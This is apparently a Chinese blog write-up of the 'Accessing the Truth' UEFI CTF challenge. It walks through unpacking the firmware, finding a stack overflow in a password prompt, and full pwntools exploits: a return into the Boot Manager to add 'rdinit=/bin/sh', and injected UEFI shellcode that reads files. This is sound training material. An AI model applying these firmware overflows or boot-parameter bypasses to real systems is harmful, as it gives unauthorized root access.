---
title: UEFI PWN 总结
date: 2024-03-22 16:21:06
tags:
  - UEFI
  - WriteUp
draft: true
---

# 基础概念

## 系统启动的典型步骤

1. 加电自检 - `BIOS/UEFI` 运行，进行硬件检测和初始化
   - BIOS（Basic Input/Output System）是固化在主板 ROM 芯片上的一组程序，在系统加电后首先运行，负责硬件自检和初始化，以及引导加载操作系统
   - UEFI（Unified Extensible Firmware Interface）是一种新的主板固件接口标准，用于替代传统的 BIOS。它提供了更多高级特性，如图形界面、更快启动速度等
2. 引导 - `BIOS/UEFI` 根据设置从硬盘/ U盘 等设备加载 Bootloader
   - Bootloader 是操作系统内核运行前的一小段引导程序，负责初始化硬件环境，加载内核映像到内存，为内核运行做准备。常见的 Bootloader 有 GRUB、U-Boot 等
3. Bootloader 初始化硬件，加载内核映像和 initramfs 到内存
   - `initramfs/initrd` 是一个包含必要启动文件和驱动的微型根文件系统，以 cpio 或其他格式存储，在内核启动初期使用
4. 内核解压并初始化，挂载 initramfs 作为临时根目录
5. 内核启动 init 进程，完成其他初始化并启动系统服务
6. init 切换到真正的根文件系统，启动用户空间的应用程序

简单来说就是：BIOS/UEFI 加载 Bootloader，Bootloader 再加载操作系统内核，内核启动再完成其它初始化。

# 例题 1：Accessing the Truth

- 题目链接：[Accessing_the_Truth.tar.gz](https://drive.google.com/file/d/1yc2FS8Y2Hq48oeJdpjHZSIxDiPbfWXG2/view?usp=drive_link)

## Analysis

UEFI pwn 通常需要研究基于 `EDK II` 编译生成的固件镜像文件 `OVMF.fd`，可用于在 QEMU 等虚拟机中提供 UEFI 支持，可以借助现有工具 `uefi-firmware-parser` 来进行初步解包：

```bash
# -e 解包，-c 打印信息，-O 保存到当前目录 ${FILENAME}_output/ 下
uefi-firmware-parser -ecO ./OVMF.fd
```

通常基于 edk2 的固件镜像会提供 UI 和 EFI Shell 两种交互方式，在其中可以进行 boot 参数的设置。题目也提供了 `boot.nsh`，其中 `.nsh` 是 UEFI Shell 脚本文件的扩展名。这些脚本文件包含一系列 UEFI Shell 命令,可以用于自动执行各种任务,如加载驱动程序、配置设备、启动操作系统等。UEFI 提权 pwn 的目标往往就是进入 UI 或者 EFI SHELL 的交互界面，修改 boot 启动参数为 `console=ttyS0 -initrd=initramfs.cpio rdinit=/bin/sh` 就可以绕开 init 脚本以 root 身份进入系统并获得 flag。

在进行逆向分析之前，还要明确分析的对象，故先运行启动脚本而后可以发现在启动过程中长按 `Esc (b"\x1b")` 或 `F12` 或 `F2` 都无法进入 Bios 界面，而是要求输入密码：

```bash
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
Setup Utility
Enter Password:
```

这里的 `BdsDxe` 是 UEFI 启动过程中的一个驱动程序，负责从固件卷（Firmware Volume）中加载启动项。即 UEFI 固件中自定义了一个名为「UiApp」的启动项，它覆盖了原本进入 BIOS 设置的启动项。所以按 ESC 键会加载运行这个「UiApp」程序，而不是进入正常的 BIOS 设置界面。

对刚接触 UEFI 的攻击者而言，定位有漏洞的校验程序可能是一个阻碍，这里有一种比较暴力的做法，即直接根据字符串定位：

```bash
# nix-shell -p ugrep
ug --encoding=UTF-16LE "Enter Password"
```

因为 UEFI 中的字符串编码方式有可能是 UTF-16 小端序，故采用上述命令在解包出来的目录下搜索找到：

```bash
Binary file volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section3/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-462caa21-7614-4503-836e-8ab6f4662331/section0.pe matches
```

接下来就可以进入 ida 分析了。可以继续搜字符串找到主要逻辑函数（其实就在开头，ida 处理 UTF-16LE 麻烦的话可以直接到 xxd | nvim 里面用正则找），进行分析就可以发现函数中喜闻乐见的栈溢出了：

输入 `\n` 可以绕开长度检查而让指针增加，同时当前长度会被 `\x00` 截断：

```c
    my_puts(L"Enter Password: \n");
    while ( 1 )
    {
      v8 = my_getchar();
      ++v15;
      if ( v8 == '\r' )
        break;
      if ( v8 != '\n' )
      {
        v9[v15] = v8;
        my_puts(L"*");
        v5 = str_leng(v9);
        if ( v5 >= v13 - 1 )
          break;
      }
    }
    my_puts(L"\n");
    sub_A68(v9, v15, v11);
    if ( !sub_9AC(v11, &unk_1B840, v13) )
      return 1;
    my_puts(L"Wrong!!\n");
    ++v14;
```

## Exploitation

来到利用部分，为了方便调试可以先根据 `run.py` 改一个 pwn 脚本出来，若涉及 UEFI UI 的操作可以用 `socat -,raw,echo=0 SYSTEM:"./exp.py"` 运行：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

# from lianpwn import *
from pwn import *
import subprocess

context.arch = "amd64"
context.log_level = "debug"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

fname = "/tmp/uefipwn"
subprocess.call(["cp", "OVMF.fd", fname])
subprocess.call(["chmod", "u+w", fname])
io = process(
    [
        "qemu-system-x86_64",
        "-m",
        "64M",
        "-drive",
        "if=pflash,format=raw,file=" + fname,
        "-drive",
        "file=fat:rw:contents,format=raw",
        "-net",
        "none",
        "-nographic",
        "-s",
    ],
    env={},
)


def enterUiApp():
    rn(1)
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")


enterUiApp()

ia()
```

到了这一步，这道题已经解决大半，接下来就回到了我们最熟悉的 ROP 环节，但是应该把控制流劫持到什么地方呢？毕竟这里没有机会去 `system("/bin/sh")` 了。

### Ret2Boot-Manager

不妨考虑这个 UiApp，它是一个密码校验程序，那假如密码正确会发生什么呢？没错，就是回到 bios 的 ui 界面中！我们的目标就是回去修改 boot 启动参数加上 `rdinit=/bin/sh` 绕开 init 脚本实现提权。

所以回到 `ModuleEntryPoint` 函数，发现如下分支判断：

```c
if ( (unsigned __int8)enterPassword() )
  {
    if ( !byte_1BA40 )
    {
      if ( (*(__int64 (__fastcall **)(_QWORD, void *, __int64 *))(qword_1BB58 + 152))(
             *(_QWORD *)(qword_1BB50 + 56),
             &unk_1B880,
             &v171) < 0 )
        v171 = 0i64;
      if ( (*(__int64 (__fastcall **)(_QWORD, void *, unsigned __int64 *))(qword_1BB58 + 152))(
             *(_QWORD *)(qword_1BB50 + 56),
             &unk_1B870,
             &v172) < 0 )
        v172 = 0i64;
      if ( v171 )
```

故直接把控制流劫持到 if 里面即可：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   socat -,raw,echo=0 SYSTEM:"./exp.py"
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

# from lianpwn import *
from pwn import *
import subprocess

context.arch = "amd64"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

fname = "/tmp/uefipwn"
subprocess.call(["cp", "OVMF.fd", fname])
subprocess.call(["chmod", "u+w", fname])
io = process(
    [
        "qemu-system-x86_64",
        "-m",
        "64M",
        "-drive",
        "if=pflash,format=raw,file=" + fname,
        "-drive",
        "file=fat:rw:contents,format=raw",
        "-net",
        "none",
        "-nographic",
        "-s",
    ],
    env={},
)


def enterUiApp():
    context.log_level = "debug"
    rn(1)
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")
    context.log_level = "info"


enterUiApp()

ru(b"Enter Password: \r\n")
# input("debug")
s(b"\n" * 0x70 + p64(0x101) + b"\r")

ru(b"Enter Password: \r\n")
payload = flat(
    {
        0xC0 - 0x18: [
            0x28B0DD5,
        ],
    },
    filler=b"\n",
)
payload += b"\r"
s(payload)

ia()
```

![UEFI-success1](static/uefi-success1.png)

最后在 `Boot Maintenance Manager`.`Boot Options`.`Add Boot Option`.`bzImage` 下新增自定义的启动参数条目（直接照抄 boot.nsh）：`console=ttyS0 -initrd=initramfs.cpio rdinit=/bin/sh` 即可实现提权利用。

### UEFI Shellcode

其实在本题栈溢出的情况下，接下来的利用就是开放性的做法了，上面只是提供了一种最简单的提权办法：Ret2Boot-Manager（我自己起的名😋）借助已有的 ui 接口篡改启动选项。我在学习这道题的时候还看到了 `Bootloader Shellcode` 的做法，写入 shellcode 之所以可行是因为在 UEFI 阶段：

- 大部分内存默认是可执行的
- UEFI 规范并未强制要求加入栈保护（canary），这取决于编译器的支持
- ASLR 需要操作系统的支持，但是 UEFI 运行于操作系统之前，故 UEFI pwn 中不太需要考虑内存随机化

特别对于本题而言，直接把 shellcode 溢出写到栈上再用已知栈地址去调用可以实现 bootloader shellcode 的攻击了。

UEFI Shellcode 的实现思路通常围绕 UEFI 提供的 BootServices 来实现读取文件、写入文件等操作。其中 UEFI Boot Services 提供了一系列的函数，用于在UEFI环境中执行各种操作，如内存管理、设备控制、文件操作等。这些服务只在操作系统启动之前可用，启动后由操作系统接管这些功能。

```python
#!/usr/bin/env python3

# from lianpwn import *
from pwn import *
from subprocess import Popen, PIPE

context.arch = "amd64"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

base = 0x0000000028A7000
addr_SystemTable = base + 0x1BB50
addr_SimpleFile = base + 0x110
addr_ProtocolGuid = 0x28C2760
addr_Root = base + 0x210
addr_File = base + 0x290
addr_Path = base + 0x310
addr_Buf = 0x3E01010
addr_print = base + 0x1EE6
shellcode = """
// rbp = SystemTable->BootService
mov rax, [{pSystemTable}]
mov rbp, [rax + 0x60]
// LocateProtocol(...);
mov r8d, {pSimpleFile}
mov ecx, {pProtocolGuid}
xor edx, edx
xor eax, eax
mov ax, 0x140
add rax, rbp
call [rax]
// SimpleFile->OpenVolume(SimpleFile, &Root)
mov rbp, [r8]
mov rax, [rbp+8]
mov edx, {pRoot}
mov rcx, rbp
call rax
// Root->Open(Root, &File, "path", EFI_FILE_MODE_READ ,EFI_FILE_READ_ONLY);
mov r8d, {pRoot}
mov rbp, [r8]
xor r9d, r9d
mov r10d, r9d
inc r9d
mov edx, {pFile}
mov [rdx], r10
inc r10d
mov rcx, rbp
mov r8d, {pPath}
// L"flag.txt"
"""
path = b"initramfs.cpio\0"
utf16_path = b""
for c in path:
    utf16_path += bytes([c, 0])
for i in range(0, len(utf16_path), 8):
    b = utf16_path[i : i + 8]
    b += b"\0" * (8 - len(b))
    if i == 0:
        shellcode += """
        mov rbx, {}
        not rbx
        mov [r8], rbx
        """.format(hex(0xFFFFFFFFFFFFFFFF ^ u64(b)))
    else:
        shellcode += """
        mov rbx, {}
        not rbx
        mov [r8+{}], rbx
        """.format(hex(0xFFFFFFFFFFFFFFFF ^ u64(b)), i)
shellcode += """
mov rax, [rbp+8]
call rax
// file->Read(file, &size, buf)
mov r8d, {pFile}
mov rbp, [r8]
xor r8d, r8d
xor edx, edx
mov edx, 0x0101ffff
mov [rsp], rdx
mov rdx, rsp
mov rcx, rbp
mov rax, [rbp+0x20]
call rax
// find flag
mov rbx, 0x2d465443
xor edi, edi
lp:
mov eax, [rdi]
cmp rax, rbx
jz found
inc edi
jmp lp
found:
mov rcx, rdi
mov eax, {puts}
call rax
mov rcx, rdi
inc rcx
mov eax, {puts}
call rax
"""
shellcode = asm(
    shellcode.format(
        pSystemTable=addr_SystemTable,
        pSimpleFile=addr_SimpleFile,
        pProtocolGuid=addr_ProtocolGuid,
        pRoot=addr_Root,
        pFile=addr_File,
        pPath=addr_Path,
        pBuf=addr_Buf,
        puts=addr_print,
    )
)
print(shellcode)
assert b"\x00" not in shellcode


def enter_bootloader():
    sa(b"2J", b"\x1b\x5b\x32\x34\x7e" * 10)
    payload = b"\n" * (0x58 + 0x30)
    payload += p64(0xDEADBE00)  # rbx
    payload += p64(0xDEADBE01)  # r12
    payload += p64(0xDEADBE02)  # r13
    payload += p64(0xDEADBE03)  # rbp
    payload += p64(0x3EBC701)
    payload += b"\x90"
    payload += shellcode
    payload += b"\r"
    payload = payload.replace(b"\x00", b"\n")
    sa(b"Enter Password: \r\n", b"\r")
    sa(b"Enter Password: \r\n", b"\r")
    input("DEBUG")
    sa(b"Enter Password: \r\n", payload)


fname = tempfile.NamedTemporaryFile().name
os.system("cp OVMF.fd %s" % (fname))
os.system("chmod u+w %s" % (fname))
io = process(
    [
        "qemu-system-x86_64",
        "-monitor",
        "/dev/null",
        "-m",
        "64M",
        "-drive",
        "if=pflash,format=raw,file=" + fname,
        "-drive",
        "file=fat:rw:contents,format=raw",
        "-net",
        "none",
        "-nographic",
        "-s",
    ],
    env={},
)

enter_bootloader()
flag1 = b"CFB"
ru(flag1)
flag1 += ru(b"}")
flag2 = ru(b"\n").replace(b"\r", b"")
flag = ""
for i in range(len(flag2)):
    flag += chr(flag1[i]) + chr(flag2[i])
flag += "}"

__import__("lianpwn").success(flag)
```

# References

\[1\] [Pwn2Win CTF 2021 Writeup](https://ptr-yudai.hatenablog.com/entry/2021/05/31/232507#Pwn-373pts-Accessing-the-Trush-8-solves) . _ptr-yudai_

\[2\] [解决第一个UEFI PWN——ACCESSING THE TRUTH解题思路](https://sung3r.github.io/) . _sung3r_

\[3\] [D^3CTF 2022 PWN - d3guard official writeup](https://eqqie.cn/index.php/archives/1929) . _eqqie_

\[4\] [x86 架构 BIOS 攻击面梳理与分析](https://www.cnblogs.com/L0g4n-blog/p/17369864.html) . _L0g4n_
